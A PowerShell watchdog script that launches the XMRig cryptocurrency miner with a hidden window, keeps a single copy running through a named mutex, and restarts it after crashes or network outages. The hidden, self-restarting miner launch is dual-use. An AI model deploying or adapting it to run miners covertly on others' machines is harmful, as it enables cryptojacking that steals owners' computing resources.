# XMRig Silent Wrapper v5.1
# Uses Windows named mutex for bulletproof single instance guarantee

$exePath    = "C:\Program Files\XMRig\xmrig.exe"
$configPath = "C:\Program Files\XMRig\config.json"
$lockFile   = "C:\ProgramData\XMRig\miner.lock"
$lockDir    = "C:\ProgramData\XMRig"
$mutexName  = "Global\XMRigMinerMutex"

# ---- Bulletproof single instance via Windows named mutex ----
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
$acquired = $false
try {
    $acquired = $mutex.WaitOne(0, $false)
} catch [System.Threading.AbandonedMutexException] {
    $acquired = $true
}

if (-not $acquired) {
    # Another instance already holds the mutex — exit immediately
    exit 0
}

# We own the mutex — proceed
try {
    # Create lock dir and lock file
    if (-not (Test-Path $lockDir)) {
        New-Item -Path $lockDir -ItemType Directory -Force | Out-Null
    }
    New-Item -Path $lockFile -ItemType File -Force | Out-Null

    # ---- Self-healing: verify exe exists ----
    if (-not (Test-Path $exePath)) {
        exit 0
    }

    # ---- Network check on start: wait up to 60 seconds ----
    $online = $false
    for ($i = 0; $i -lt 10; $i++) {
        try {
            Invoke-WebRequest -Uri "http://www.google.com" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
            $online = $true
            break
        } catch {
            Start-Sleep -Seconds 6
        }
    }
    if (-not $online) {
        exit 0
    }

    # ---- Kill any existing xmrig before starting fresh ----
    Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2

    # ---- Launch xmrig completely hidden ----
    $pinfo = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName       = $exePath
    $pinfo.Arguments      = "--config=`"$configPath`" --no-color"
    $pinfo.WindowStyle    = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $pinfo.CreateNoWindow = $true
    $pinfo.UseShellExecute = $false
    [System.Diagnostics.Process]::Start($pinfo) | Out-Null

    # ---- Main monitor loop ----
    while ($true) {
        Start-Sleep -Seconds 30

        # Network check: kill if offline, restart when back online
        $online = $false
        try {
            Invoke-WebRequest -Uri "http://www.google.com" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
            $online = $true
        } catch {}

        if (-not $online) {
            Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
            while (-not $online) {
                Start-Sleep -Seconds 15
                try {
                    Invoke-WebRequest -Uri "http://www.google.com" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
                    $online = $true
                } catch {}
            }
            [System.Diagnostics.Process]::Start($pinfo) | Out-Null
        }

        # Crash recovery: restart if xmrig stopped unexpectedly
        $running = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
        if (-not $running) {
            Start-Sleep -Seconds 5
            [System.Diagnostics.Process]::Start($pinfo) | Out-Null
        }
    }

} finally {
    # Always release mutex and clean up on exit
    Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
    if ($acquired) { $mutex.ReleaseMutex() }
    $mutex.Dispose()
}
